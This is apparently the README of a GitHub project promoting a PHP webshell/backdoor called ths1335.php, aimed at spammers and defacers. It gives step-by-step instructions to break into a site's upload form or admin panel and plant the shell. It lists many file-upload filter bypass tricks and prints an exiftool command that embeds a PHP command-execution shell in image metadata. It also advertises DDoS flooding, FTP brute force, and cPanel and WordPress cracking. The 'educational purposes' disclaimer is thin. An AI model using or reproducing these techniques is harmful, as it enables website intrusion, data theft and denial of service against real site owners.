# Php-Webshell/Backdoor

A PHP webshell created by us TermuxHackz Society.  For educational and/or testing purposes only. 
Can also be used for ctf challenges, which has uploader and main shell. (ths1335.php)

# Note
#### [+] Always investigate malware in a secure environment. This means: separately from your network and in a virtual machine!
#### [+] Some backdoors may be backdoored (yes, really). Don't ever use this for any malicious purposes.
#### [+] The backdoors follow the format: Backdoorname_SHA1.php, granted the name of the backdoor is known 
#### [+] The folder TermuxHackz Webshell contains the webshell (uploader and main shell[ths1335 shell]). 
#### [+] Dont just be a defacer alone!, do cool shits with the webshell. But can also be used for defacing

# Created by
<b>TermuxHackz Society Team Members - AnonyminHack5</b>
<br><br>
Ths1335.php is a powerful webshell which has several and multiple features which are useful for spammers, defacers and also 
useful for those who loves to try cool shits too haha ^_^. It contains, Fake Mailer, Whois scan, iplookup, Cracking Cpanel, Whm, Admin Panel Finder and so much more. This help bypass site security and not like other shells.

# Steps to use this webshell
```
1) Hack the site admin panel or look for site with upload option (for uploading pics, images, etc) 
2) Look for upload section 
3) First try to upload the Tuploader.php into the site
If the site restricts php files, and says only png, jpeg or jpg images allowed 
Then next step is for you to upload the payload-image.png or try some file upload bypass like tuploader.pHp, tuploader.phtml etc  


The payload-image.png is an injected code for the php file
So once the png image has been successfully uploaded
But if the payload-image doesnt work. Use some file upload bypass tricks

4) Copy the image/shell location
5) Open in a tab
6) Then once you see the uploader
7) Upload the main shell which is the ths1335.php 
8) Then you can use the shell.. 

Hahah, make sure you use with care!! 
```
# File Upload Bypass 
<h4>File Upload General Methodology</h4>
Other useful extensions:<br>
<b>PHP:</b> .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc <br>
<b>ASP:</b> .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml <br>
<b>Jsp:</b> .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action <br>
<b>Coldfusion:</b> .cfm, .cfml, .cfc, .dbm <br>
<b>Flash:</b> .swf <br>
<b>Perl:</b> .pl, .cgi <br>
<b>Erlang Yaws Web Server:</b> .yaws <br>
<br/>
<h3>Bypass file extensions checks</h3>
1) If they apply, the check the previous extensions. Also test them using some uppercase letters: <code>pHp, .pHP5, .PhAr ..</code> <br>
2) Check adding a valid extension before the execution extension (use previous extensions also):<br><br>
<code>
file.png.php
file.png.Php5
</code>
<br/>
3) Try adding special characters at the end. You could use Burp to bruteforce all the ascii and Unicode characters. (Note that you can also try to use the previously motioned extensions) <br>
<br>
<code>
file.php%20<br/>
file.php%0a<br/>
file.php%00<br/>
file.php%0d%0a<br/>
file.php/<br/>
file.php.\<br/>
file.<br/>
file.php....<br/>
file.pHp5...<br/>
</code>
<br>
4) Try to bypass the protections tricking the extension parser of the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.<br/>
<br>
<code>
file.png.php<br/>
file.png.pHp5<br/>
file.php%00.png<br/>
file.php\x00.png<br/>
file.php%0a.png<br/>
file.php%0d%0a.png<br/>
flile.phpJunk123png<br/>
</code><br/>
<br>
5) Add another layer of extensions to the previous check: <br/>
<br><code>
file.png.jpg.php
file.php%00.png%00.jpg
</code>
<br>
6) Try to put the exec extension before the valid extension and pray so the server is misconfigured. **(useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php** will execute code): <br>
<br><code>
ex: file.php.png 
</code>
<br>
7) Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”) <br><br>
8) Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php <br>

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

<h2> Bypass Content-Type & magic number </h2>
1) Bypass Content-Type checks by setting the value of the Content-Type header to: <b>image/png</b> , <b>text/plain</b> ,<b> application/octet-stream</b><br>
<br>
>> Content-Type wordlist: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt <br>
<br>
2) Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata: <b>exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg </b>
 <br>

Or you can try other tricks you know that might work. Haha
</b>
# Some features of ths1335 Shell
1) File Manager
2) Dumping SQL database 
3) Find admin panel page
4) Execute ssh commands on remote server
5) TCP and UDP flood ddos
6) CGI Shell
7) Ftp brute force
8) Cracking Cpanels and Whmpanels
9) Crack WordPress sites and change all usernames and password
10) Code Injector
11) And so much fuckin more hahahaha


# Ths1335 Shell Images
![](ths1.png)

![](ths2.png)

![](ths3.png) 

# License
ths1335.php shell is under the MIT license. This webshell is free for all use and for home and educational usages as well. Thanks to our team of skilled programmers hahaha. 

Incase you dont like to clone from github, haha, you can download the TermuxHackz Webshell zip from mediafire. <br><br>
<strong>Download here:- <a href="" target="_blank" alt="TermuxHackz Webshell">Download TermuxHackz WebShell here</a>.</strong>       

<p>Kindly star or fork this repo, to support us for this wonderful project </p>

# Donate 
![](donations.jpeg) 
Donate to us if you love and appreciate the project. Donate <a href="https://paypal.me/kwasconcept" target="_blank">here</a>. Thanks for donations.... 


# Version
```
Version 1.0
```

# Join our groups
<b>Join our Telegram group: </b> <a href="https://t.me/termuxhackz1">here</a><br>
<b> Visit our <a href="https://termuxhackz.github.io/index.html">Site</a><br></b>
<b> Join our facebook group: <a href="https://www.facebook.com/groups/423043615428159/?ref=share">here</a></b><br>
Join our telegram Channel also by scanning the qr code below <br>

![](images/received_1065724630950464.jpeg) 

# Notice Bugs? 
If you use our webshell and you notice bugs in em feel free to email me those bugs and We will try fix them. 
Report those bugs to me <a href="mailto:AnonyminHack5@protonmail.com" target="_blank">here</a>. 

<h5>Thanks alot for the support</h5>

# Faqs
##### 1) Some features doesn't work? 
<strong>If you notice that some features of the shell doesnt work, Try using a linux system with a good internet connection 📶 and try again. It should work. Using a windows system with this powerful webshell is limited. Thanks :) </strong>








 



